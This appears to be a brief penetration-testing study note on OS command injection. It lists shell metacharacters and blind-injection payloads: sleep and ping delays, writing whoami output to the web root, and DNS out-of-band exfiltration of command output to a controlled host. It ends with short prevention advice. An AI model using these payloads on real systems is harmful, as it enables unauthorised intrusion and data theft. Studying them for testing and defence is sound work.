# command_injection

## fuzz the application

```
shell metacharacters: &, &&, |, ||, ;, \n; `, $()
```

### for blind command injection, you need to get creative

* trigger `a time delay` using `ping` or `sleep` command
    
    ```
    127.0.0.1 && sleep 10 & # only for unix
    127.0.0.1 && ping -c 10 127.0.0.1
    ```

* output the response of the command in the web root and retrieve the file directly using browser

    ```
    127.0.0.1 & whoami > /var/www/static/whoami.txr &
    ```
* open an out-of-band channel back to a server you control
    
    ```
    127.0.0.1 & nslookup kgjdfjdfhs.web.staticker.com &
    127.0.0.1 & `whoami`.kgjdfjdfhs.web.staticker.com &
    ```

### how to prevent xcommand injection

* never call out to OS commands from application-layer code. Instead, implement the required functionality using safer platformAPIs.
* strong input validation
    * validate against a whitlist of permitted values
    * validate that the input is as expected or valid input

## links

`Web Application Hacker's Handbook`
chapter 10 - 362 - 368
chapter 21 - 832 - 833
